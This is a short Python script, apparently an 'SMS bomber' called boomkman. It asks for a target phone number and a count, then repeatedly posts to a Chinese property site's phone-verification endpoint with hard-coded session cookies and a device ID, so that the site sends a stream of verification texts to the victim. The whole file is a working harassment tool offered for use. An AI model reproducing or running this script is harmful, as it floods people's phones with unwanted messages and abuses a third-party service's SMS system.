import requests
import time
x = 0
print("""\033[0;34;40m
      _                 _                          
     | |               | |                         
     | |__   ___   ___ | | ___ __ ___   __ _ _ __  
     | '_ \ / _ \ / _ \| |/ / '_ ` _ \ / _` | '_ \ 
     | |_) | (_) | (_) |   <| | | | | | (_| | | | |
     |_.__/ \___/ \___/|_|\_\_| |_| |_|\__,_|_| |_|

""")
tel = str(input("输入电话号码:"))
num = int(input("轰炸次数:"))
data1 = {'mobile': tel,'type': '1','deviceId': 'WHJMrwNw1k/G4XYz7Zf5VwQTFq6MY9kJuW8VCprGnbdU+bIHe8lnKNtAKcvdL/xBkvYh8q11Zsz1VsiuO8c1kgBUTBvvMEZ7OdCW1tldyDzmQI99+chXEioIl0lb0UxViF4FLg94PeU+vLMn6p3SpniHkvLSSe4GZIbtNikEBm645nqbECcowApFmlvWS/WAprjl+d2XxfVgh3MJ6BdlfhdCpI3Tsb+2f7xWD7mkTFhfVC1YkGmEVUmFLWtA20YVjjpbeDlb6VwRIExklGMVEHg==1487582755342'}
header1 = {
'Accept': 'application/json, text/javascript, */*; q=0.01'
,'Accept-Encoding': 'gzip, deflate, br'
,'Accept-Language': 'zh,en-GB;q=0.9,en;q=0.8'
,'Connection': 'keep-alive'
,'Content-Length': '367'
,'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
,'Cookie': 'PHPSESSID=8aqojqpb0tpfocevdbn9nda68d; domain=cd; historyCity=%5B%22%5Cu6210%5Cu90fd%22%5D; _ga=GA1.2.359150884.1673617886; _gid=GA1.2.709880235.1673617886; HMF_CI=d3e48c0796fa5c3b2f1700dfaf9dcb8b9fe4f307245a3505774a6d980f2d5831145e6a5a9c2bebffdad4953b0c68ae914a79ab2ea20de93bfed9522e3b0f5567c7; gr_user_id=ebd85f7d-9acf-4c34-8824-b6db0ad32337; 8fcfcf2bd7c58141_gr_session_id=9b3abb9a-f297-485c-839a-799b686b6057; 8fcfcf2bd7c58141_gr_session_id_9b3abb9a-f297-485c-839a-799b686b6057=true; Hm_lvt_94ed3d23572054a86ed341d64b267ec6=1673617887; Hm_lpvt_94ed3d23572054a86ed341d64b267ec6=1673617887; smidV2=20230113215126e9bf688c206896b18f5e1f5bb443d2bb0070b48e0250a2f60'
,'DNT': '1'
,'Host': 'cd.5i5j.com'
,'Origin': 'https://cd.5i5j.com'
,'Referer': 'https://cd.5i5j.com/'
,'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"'
,'sec-ch-ua-mobile': '?0'
,'sec-ch-ua-platform': '"Windows"'
,'Sec-Fetch-Dest': 'empty'
,'Sec-Fetch-Mode': 'cors'
,'Sec-Fetch-Site': 'same-origin'
,'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76'
,'X-Requested-With': 'XMLHttpRequest'}
while(x < num):
    v = requests.post(url="https://cd.5i5j.com/regloginnew/ajaxphonecodenew",data=data1,headers=header1)
    print(v.status_code)
    x += 1
    time.sleep(2)